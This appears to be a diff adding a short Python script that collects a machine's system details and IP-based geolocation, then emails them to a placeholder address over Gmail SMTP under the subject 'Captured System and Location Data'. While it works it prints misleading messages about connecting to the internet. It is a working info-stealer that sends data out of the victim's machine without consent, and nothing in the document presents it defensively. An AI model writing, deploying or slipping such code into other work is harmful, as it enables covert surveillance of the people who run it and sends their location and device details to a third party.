@@ -1,0 +1,85 @@
+import subprocess
+import sys
+import platform
+import requests
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+
+def install_requests():
+    try:
+        import requests
+    except ImportError:
+        print("Please wait while we install the requests module...")
+        subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
+        print("requests module installed successfully.")
+
+def get_location():
+    response = requests.get("http://ip-api.com/json/")
+    data = response.json()
+    if data['status'] == 'success':
+        return data
+    else:
+        return None
+
+def get_system_info():
+    return {
+        "System": platform.system(),
+        "Node Name": platform.node(),
+        "Release": platform.release(),
+        "Version": platform.version(),
+        "Machine": platform.machine(),
+        "Processor": platform.processor(),
+    }
+
+def send_data_via_email(system_info, location_data, email_to):
+    email_from = "your_email@gmail.com"
+    email_password = "your_password"
+    
+    subject = "Captured System and Location Data"
+    body = f"""
+    System Information:
+    System: {system_info['System']}
+    Node Name: {system_info['Node Name']}
+    Release: {system_info['Release']}
+    Version: {system_info['Version']}
+    Machine: {system_info['Machine']}
+    Processor: {system_info['Processor']}
+
+    Location Data:
+    IP Address: {location_data['query']}
+    Country: {location_data['country']}
+    Region: {location_data['regionName']}
+    City: {location_data['city']}
+    ZIP: {location_data['zip']}
+    Latitude: {location_data['lat']}
+    Longitude: {location_data['lon']}
+    ISP: {location_data['isp']}
+    """
+
+    msg = MIMEMultipart()
+    msg['From'] = email_from
+    msg['To'] = email_to
+    msg['Subject'] = subject
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    print("Please wait while we connect to the internet...")
+    server = smtplib.SMTP('smtp.gmail.com', 587)
+    server.starttls()
+    server.login(email_from, email_password)
+    text = msg.as_string()
+    server.sendmail(email_from, email_to, text)
+    server.quit()
+    print("Data sent successfully.")
+
+if __name__ == "__main__":
+    print("Please wait while we connect to the internet...")
+    install_requests()
+    location_data = get_location()
+    system_info = get_system_info()
+    if location_data:
+        send_data_via_email(system_info, location_data, "recipient_email@example.com")
+    else:
+        print("Failed to retrieve location data.")
+
